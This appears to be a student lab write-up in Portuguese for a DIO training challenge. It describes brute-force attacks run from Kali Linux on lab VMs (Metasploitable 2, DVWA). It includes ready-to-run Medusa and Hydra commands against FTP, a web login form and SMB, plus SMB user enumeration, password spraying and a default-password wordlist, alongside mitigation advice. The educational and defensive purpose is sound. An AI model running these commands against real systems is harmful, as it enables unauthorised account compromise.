# 🔐 Projeto: Ataques de Força Bruta com Medusa no Kali Linux

Este projeto foi desenvolvido como parte do desafio prático da DIO, simulando ataques de força bruta em serviços vulneráveis utilizando o Kali Linux e a ferramenta Medusa, com o objetivo de identificar falhas de autenticação e aplicar boas práticas de mitigação.

---

## 🎯 Objetivos

- Simular ataques de força bruta em diferentes serviços (FTP, Web e SMB).
- Utilizar o Medusa para automatizar testes de senha.
- Compreender a importância de ambientes controlados em testes ofensivos.
- Propor medidas de mitigação para serviços vulneráveis.

---

## 🧪 Estrutura do Ambiente

| Sistema          | Função        | IP Exemplo        | Observações                      |
|------------------|---------------|-------------------|----------------------------------|
| Kali Linux       | Atacante      | 192.168.56.101     | Máquina com ferramentas de pentest |
| Metasploitable 2 | Alvo FTP/SMB  | 192.168.56.102     | Sistema vulnerável configurado no VirtualBox |
| DVWA             | Web Vulnerável| 192.168.56.103     | Aplicação rodando em servidor web |

> Rede configurada em modo **Host-Only** para comunicação isolada.

---

## 🧰 Ferramentas Utilizadas

- **Kali Linux** – Distribuição de testes de penetração
- **Medusa** – Ferramenta de força bruta paralela
- **Hydra** – (alternativa usada para Web Forms)
- **Enum4linux** – Enumeração de usuários SMB
- **DVWA (Damn Vulnerable Web App)** – Aplicação vulnerável

---

## 🔓 Ataques Realizados

### 📁 1. Ataque FTP com Medusa

**Comando usado:**
```bash
medusa -h 192.168.56.102 -u ftpuser -P wordlist.txt -M ftp

🌐 2. Ataque Web (DVWA Login) com Hydra

hydra -l admin -P wordlist.txt 192.168.56.103 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

🖥️ 3. Password Spraying em SMB com Medusa

Enumeração de usuários
enum4linux -U 192.168.56.102 > smb-users.txt

Ataque com senha padrão:
medusa -h 192.168.56.102 -U smb-users.txt -p 123456 -M smbnt

📂 Wordlist Utilizada

Exemplo de conteúdo da wordlist.txt:

123456
admin
password
toor
kali
root


📸 Evidências

As imagens dos testes estão organizadas na pasta /images:

Imagem	Descrição
ftp-attack.png	Medusa encontrando senha FTP
dvwa-hydra.png	Hydra atacando login do DVWA
smb-enum.png	Enumeração de usuários SMB
🛡️ Medidas de Mitigação
Serviço	Vulnerabilidade	Mitigação Recomendável
FTP	Senhas fracas, acesso direto	Desativar FTP, usar SFTP, políticas de senha
Web	Formulário vulnerável	Implementar CAPTCHA, lockout, MFA
SMB	Reutilização de senhas fracas	Restringir enumeração, rotacionar senhas
💡 Conclusão

Este projeto demonstrou como ataques simples de força bruta podem comprometer serviços comuns quando medidas básicas de segurança não são aplicadas. O uso de ferramentas como Medusa em ambientes controlados auxilia na conscientização e na formação de profissionais defensivos e ofensivos.

📚 Referências

Medusa no Kali Linux

DVWA no GitHub

Hydra - THC

SecLists – Wordlists

Enum4linux

✍️ Autor

Projeto realizado por Paulo Moraes
Desafio prático da Digital Innovation One - DIO




